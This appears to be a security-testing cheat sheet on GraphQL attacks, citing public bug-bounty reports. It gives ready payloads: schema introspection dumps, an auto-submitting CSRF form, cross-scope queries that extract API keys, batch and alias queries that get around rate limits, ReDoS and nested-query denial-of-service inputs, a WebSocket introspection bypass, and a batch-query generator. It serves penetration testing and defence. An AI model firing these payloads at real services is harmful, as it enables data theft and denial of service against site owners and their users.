---
tags:
  - critical
  - server-side
---

# GraphQL Attacks

## TL;DR

GraphQL exposes rich attack surface: introspection for schema discovery, batch queries for rate limit bypass, nested queries for DoS, and authorization bypasses.

**Check WebSocket endpoints when HTTP introspection is disabled.**

## Detection

### Identify Endpoints

```
/graphql
/api/graphql
/query
/v1/graphql
/graphql/console
```

### Check Introspection

```graphql
query { __schema { types { name } } }
```

If returns schema → introspection enabled.

## Exploitation

### Introspection

**Full Schema Dump:**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types { 
      kind name description
      fields(includeDeprecated: true) {
        name type { kind name }
      }
    }
  }
}
```

**Deprecated fields often still work:**
```graphql
query {
  team(handle:"security") {
    id _id bug_count sla_failed_count
  }
}
```

### Authorization Bypasses

**CSRF via GET:**
```html
<form action="https://target.com/api/graphql/" method="GET">
  <input name="query" value="mutation { createSnippet(...) }">
</form>
<script>document.forms[0].submit()</script>
```

**Cross-Scope Data Access:**
```graphql
# Access location data without permissions
query { locations { id address { address1 city } } }

# Extract API keys
query { publications(first: 100) { edges { node { app { apiKey } } } } }
```

### Batch Query Abuse

**Rate Limit Bypass:**
```graphql
mutation BulkReports($team: String!) {
  q0: createReport(input: {team_handle: $team}) { was_successful }
  q1: createReport(input: {team_handle: $team}) { was_successful }
  # ... repeat 75 times
}
```

**Query Alias Abuse:**
```graphql
query {
  user1: user(id: "1") { name email }
  user2: user(id: "2") { name email }
  user3: user(id: "3") { name email }
}
```

### DoS Attacks

**Circular Introspection:**
```graphql
query {
  __schema {
    types { fields { type { fields { type { fields { name } } } } } }
  }
}
```

**Regex DoS:**
```graphql
query {
  search(q: "[a-zA-Z0-9]+\\s?)+$|^([a-zA-Z0-9.'\\w\\W]+\\s?)+$\\") {
    _id
  }
}
```

**Field Explosion:**
```graphql
query {
  users { posts { comments { replies { user { posts { ... } } } } } }
}
```

### WebSocket Introspection Bypass

When HTTP disables introspection:
```javascript
ws = new WebSocket("wss://target.com/graphql");
ws.send(JSON.stringify({type: "connection_init"}));
ws.send(JSON.stringify({
  id: "1", 
  type: "start", 
  payload: {query: "{ __schema { types { name } } }"}
}));
```

## Bypasses

### Introspection Disabled

- Check WebSocket endpoint
- Use field suggestion errors
- Brute force common field names
- Check GraphiQL/Playground endpoints

### Authorization

- Test mutations via GET (CSRF bypass)
- Query deprecated fields
- Use relationships to pivot
- Check subscription permissions separately

## Real Examples

- **HackerOne #291531:** Full schema via introspection
- **HackerOne #862835:** WebSocket introspection bypass
- **HackerOne #1122408 (GitLab):** CSRF via GET mutations
- **HackerOne #984965 (TikTok):** Cross-tenant IDOR
- **HackerOne #1091303 (Shopify POS):** Manager PIN disclosure
- **HackerOne #2166697:** 75 reports per request batch abuse
- **HackerOne #2048725 (Sorare):** Circular introspection DoS

## Tools

```bash
# Quick introspection check
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' \
  https://target.com/graphql

# Tools
- GraphQL Voyager (schema viz)
- InQL (Burp extension)
- graphql-cop (security auditor)
- Altair GraphQL Client
```

### Batch Generator

```python
def generate_batch(operation, count):
    queries = [f'q{i}: {operation}' for i in range(count)]
    return 'query Batch { ' + ' '.join(queries) + ' }'

print(generate_batch('user(id:"1"){name}', 100))
```
